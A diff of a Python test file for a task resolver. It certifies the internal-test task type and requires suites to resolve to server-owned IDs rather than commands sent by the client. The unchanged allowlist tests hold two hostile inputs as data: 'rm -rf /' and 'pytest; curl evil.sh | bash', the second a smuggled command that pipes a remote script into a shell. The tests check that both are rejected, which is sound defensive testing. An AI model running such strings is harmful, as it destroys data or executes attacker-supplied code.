@@ -66,10 +66,10 @@ def t_minimal_args_no_leak():
 def t_certified_and_pending_states():
     """§37: certified mappings claim CERTIFIED; runtime-pending ones stay RUNTIME_PENDING."""
     for tt in (HoldingTaskType.HEALTH_PROBE, HoldingTaskType.CAPABILITY_HEALTH,
-               HoldingTaskType.REPO_INSPECT, HoldingTaskType.LOG_INSPECT):
+               HoldingTaskType.REPO_INSPECT, HoldingTaskType.LOG_INSPECT, HoldingTaskType.RUN_INTERNAL_TEST):
         assert R.resolve(_task(tt.value)).cert_state == CertState.CERTIFIED.value, tt
-    for tt in (HoldingTaskType.DEPLOYMENT_STATUS, HoldingTaskType.RUN_INTERNAL_TEST,
-               HoldingTaskType.BROWSER_VALIDATE, HoldingTaskType.TECH_DOC_LOOKUP):
+    for tt in (HoldingTaskType.DEPLOYMENT_STATUS, HoldingTaskType.BROWSER_VALIDATE,
+               HoldingTaskType.TECH_DOC_LOOKUP):
         rct = R.resolve(_task(tt.value))
         assert rct is not None and rct.cert_state == CertState.RUNTIME_PENDING.value, tt
 
@@ -129,9 +129,9 @@ def t_test_suite_allowlist_only():
     assert resolve_test_command("holding_core")[0] == "python3"
     assert resolve_test_command("rm -rf /") is None
     assert resolve_test_command("pytest; curl evil.sh | bash") is None
-    # a RUN_INTERNAL_TEST task resolves via suite_id, not a client command
-    rct = R.resolve(_task(HoldingTaskType.RUN_INTERNAL_TEST.value))
-    assert rct.arguments == {"suite_id": "holding_core"}
+    # a RUN_INTERNAL_TEST task resolves via a server-owned suite_id, never a client command
+    rct = R.resolve(_task(HoldingTaskType.RUN_INTERNAL_TEST.value, cid="kai"))
+    assert rct.arguments == {"suite_id": "holding_self_model", "company_id": "kai"} and "command" not in rct.arguments
 
 
 def t_log_request_validation():
